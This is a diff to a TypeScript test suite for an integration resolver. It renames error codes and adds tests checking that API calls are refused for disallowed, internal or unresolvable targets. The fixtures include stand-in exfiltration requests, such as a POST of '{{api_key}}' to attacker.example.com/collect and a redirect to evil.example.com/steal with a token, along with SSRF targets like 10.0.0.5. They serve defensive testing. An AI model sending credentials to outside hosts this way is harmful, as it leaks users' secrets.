@@ -17,7 +17,7 @@ import {
   type RunEvent,
   type ToolContext,
 } from "../../src/resolvers/index.ts";
-import type { ResolverError } from "../../src/errors.ts";
+import type { ApiCallFailureError } from "../../src/errors.ts";
 // Package-internal, deliberately not on the `resolvers` barrel.
 import { apiCallToolName } from "../../src/resolvers/integration-api-call.ts";
 import {
@@ -645,7 +645,7 @@ describe("LocalIntegrationResolver", () => {
     expect(err?.message).toContain("could not be resolved");
     expect(err!.message).not.toContain(secret);
     expect(err!.message).not.toContain(secret.toLowerCase());
-    expect((err as ResolverError).details?.target).toBe("https://{{api_key}}.api-us1.com/");
+    expect((err as ApiCallFailureError).details?.target).toBe("https://{{api_key}}.api-us1.com/");
   });
 
   it("does not scrub a guessed credential value from the host of an untemplated call", async () => {
@@ -1201,7 +1201,7 @@ describe("LocalIntegrationResolver — SSRF + redirect hardening (newly added on
         },
         ctx,
       ),
-    ).rejects.toMatchObject({ code: "RESOLVER_CREDENTIAL_EXFIL_BLOCKED" });
+    ).rejects.toMatchObject({ code: "credential_exfiltration_refused" });
     expect(fetched).toBe(0); // refused before any outbound bytes
   });
 
@@ -1227,7 +1227,7 @@ describe("LocalIntegrationResolver — SSRF + redirect hardening (newly added on
           method: "POST",
           target: "https://attacker.example.com/collect",
           headers: { "X-Bad": "a\nb" },
-          // A credential and no allowlist: alone, RESOLVER_CREDENTIAL_EXFIL_BLOCKED.
+          // A credential and no allowlist: alone, credential_exfiltration_refused.
           body: "key={{api_key}}",
         },
         makeCtx().ctx,
@@ -1276,7 +1276,7 @@ describe("LocalIntegrationResolver — SSRF + redirect hardening (newly added on
         },
         ctx,
       ),
-    ).rejects.toMatchObject({ code: "RESOLVER_CREDENTIAL_EXFIL_BLOCKED" });
+    ).rejects.toMatchObject({ code: "credential_exfiltration_refused" });
     expect(fetched).toBe(0);
   });
 });
@@ -1319,7 +1319,7 @@ describe("LocalIntegrationResolver — authorized_uris rendered per connection (
     await call("{{site_url}}/wp-json/x");
     expect(hits).toEqual(["https://wp.example.com/wp-json/x"]);
     await expect(call("https://other.example.com/wp-json/x")).rejects.toMatchObject({
-      code: "AUTHORIZED_URIS_MISMATCH",
+      code: "unauthorized_target",
     });
     expect(hits).toHaveLength(1);
   });
@@ -1331,7 +1331,7 @@ describe("LocalIntegrationResolver — authorized_uris rendered per connection (
     await call("https://{{host}}/wp-json/x");
     expect(hits).toEqual(["https://wp.example.com/wp-json/x"]);
     await expect(call("https://other.example.com/x")).rejects.toMatchObject({
-      code: "AUTHORIZED_URIS_MISMATCH",
+      code: "unauthorized_target",
     });
   });
 
@@ -1340,7 +1340,7 @@ describe("LocalIntegrationResolver — authorized_uris rendered per connection (
     [["https://{$credential.host}/**"], { host: "127.0.0.1" }, "https://{{host}}/admin"],
   ])("never pins a connection-supplied internal host (%j)", async (uris, fields, target) => {
     const { call, hits } = await toolFor(uris, fields);
-    await expect(call(target)).rejects.toMatchObject({ code: "RESOLVER_URL_BLOCKED" });
+    await expect(call(target)).rejects.toMatchObject({ code: "blocked_target" });
     expect(hits).toEqual([]);
   });
 
@@ -1367,14 +1367,14 @@ describe("LocalIntegrationResolver — authorized_uris rendered per connection (
     const err = await tools[0]!
       .execute({ method: "GET", target: "https://public.example/x" }, makeCtx().ctx)
       .catch((e: unknown) => e);
-    expect(err).toMatchObject({ code: "AUTHORIZED_URIS_EMPTY" });
+    expect(err).toMatchObject({ code: "unauthorized_target" });
     expect(hits).toEqual([]);
   });
 
   it("refuses every target when the connection's URL does not render", async () => {
     const { call, hits } = await toolFor(["{$credential.site_url}/**"], { site_url: "mysite.com" });
     const err = await call("https://attacker.example/steal").catch((e: unknown) => e);
-    expect(err).toMatchObject({ code: "AUTHORIZED_URIS_EMPTY" });
+    expect(err).toMatchObject({ code: "unauthorized_target" });
     expect((err as Error).message).toContain("does not render");
     expect(hits).toEqual([]);
   });
@@ -1384,7 +1384,7 @@ describe("LocalIntegrationResolver — authorized_uris rendered per connection (
     const { call, hits } = await toolFor(["{$credential.webhook_url}"], { webhook_url: hook });
     const err = await call("https://example.com/").catch((e: unknown) => e);
     expect(err).toMatchObject({
-      code: "AUTHORIZED_URIS_MISMATCH",
+      code: "unauthorized_target",
       details: { allowlist: ["{$credential.webhook_url}"] },
     });
     expect(JSON.stringify({ ...(err as object), message: (err as Error).message })).not.toContain(
@@ -1400,7 +1400,7 @@ describe("LocalIntegrationResolver — authorized_uris rendered per connection (
       async () => ["10.0.0.5"],
     );
     await expect(call("https://{{host}}/x")).rejects.toMatchObject({
-      code: "RESOLVER_URL_BLOCKED",
+      code: "blocked_target",
     });
     expect(hits).toEqual([]);
   });
@@ -1417,6 +1417,98 @@ describe("LocalIntegrationResolver — authorized_uris rendered per connection (
     const { call, hits } = await toolFor(["https://api.acme.com/**"], {});
     await expect(call("https://api.acme.com/{{tenant}}/x")).rejects.toThrow("{{tenant}}");
     expect(hits).toEqual([]);
+  });
+});
+
+describe("LocalIntegrationResolver — the failure codes of every api_call path (#1761)", () => {
+  /** One `GET target` via an auth allowing `https://*.acme.com/**`; `tok` is no field value. */
+  async function fail(
+    target: string,
+    opts: {
+      resolveHost?: () => Promise<string[]>;
+      fetch?: (url: string) => Promise<Response>;
+      headers?: Record<string, string>;
+    } = {},
+  ): Promise<ApiCallFailureError> {
+    const integ = makePackage("@acme/api", "1.0.0", "integration", {
+      "integration.json": JSON.stringify(
+        apiKeyIntegrationManifest("@acme/api", { authorizedUris: ["https://*.acme.com/**"] })
+          .integration,
+      ),
+    });
+    const resolver = new LocalIntegrationResolver({
+      resolveHost: opts.resolveHost ?? (async () => ["203.0.113.7"]),
+      creds: {
+        version: 1,
+        integrations: { "@acme/api": { fields: { api_key: "k", tok: "a\nb" } } },
+      },
+      fetch: (opts.fetch ?? (() => Promise.resolve(new Response("{}")))) as unknown as typeof fetch,
+    });
+    const tools = await resolver.resolve(
+      [{ name: "@acme/api", version: "^1" }],
+      makeBundle(makePackage("@acme/agent", "1.0.0", "agent", {}), [integ]),
+    );
+    const args = { method: "GET", target, ...(opts.headers ? { headers: opts.headers } : {}) };
+    return tools[0]!.execute(args, makeCtx().ctx).then(
+      () => {
+        throw new Error("expected a failure");
+      },
+      (e: unknown) => e as ApiCallFailureError,
+    );
+  }
+
+  const refused = () => Object.assign(new Error("refused"), { code: "ECONNREFUSED" });
+
+  // The codes the platform proxy answers for the same engine kinds (`classifyApiCallFailure`).
+  it.each([
+    ["not_authorized", "unauthorized_target", () => fail("https://evil.example.com/x")],
+    [
+      "ssrf",
+      "blocked_target",
+      () => fail("https://api.acme.com/x", { resolveHost: async () => ["10.0.0.5"] }),
+    ],
+    [
+      "unresolvable",
+      "upstream_unresolvable",
+      () => fail("https://typo.acme.com/x", { resolveHost: async () => [] }),
+    ],
+    [
+      "invalid_header",
+      "credential_unusable",
+      () => fail("https://api.acme.com/x", { headers: { "X-Tok": "{{tok}}" } }),
+    ],
+    [
+      "timeout",
+      "upstream_timeout",
+      () =>
+        fail("https://api.acme.com/x", {
+          fetch: () => Promise.reject(new DOMException("late", "TimeoutError")),
+        }),
+    ],
+    [
+      "transport",
+      "upstream_unreachable",
+      () => fail("https://api.acme.com/x", { fetch: () => Promise.reject(refused()) }),
+    ],
+  ] as const)("%s → %s", async (_kind, code, run) => {
+    const err = await run();
+    expect(err.name).toBe("ApiCallFailureError");
+    expect(err).toMatchObject({ code, details: { integration: "@acme/api", redirect: false } });
+  });
+
+  it("keeps a transport error's own code in details", async () => {
+    const err = await fail("https://api.acme.com/x", { fetch: () => Promise.reject(refused()) });
+    expect(err.details).toMatchObject({ errno: "ECONNREFUSED" });
+  });
+
+  it("refuses a redirect off the allowlist under the target's code, flagged, naming its host only", async () => {
+    const location = "https://evil.example.com/steal?token=t0p";
+    const err = await fail("https://api.acme.com/x", {
+      fetch: () => Promise.resolve(new Response(null, { status: 302, headers: { location } })),
+    });
+    expect(err).toMatchObject({ code: "unauthorized_target", details: { redirect: true } });
+    expect(err.message).toContain("evil.example.com");
+    expect(err.message).not.toContain("t0p");
   });
 });
 
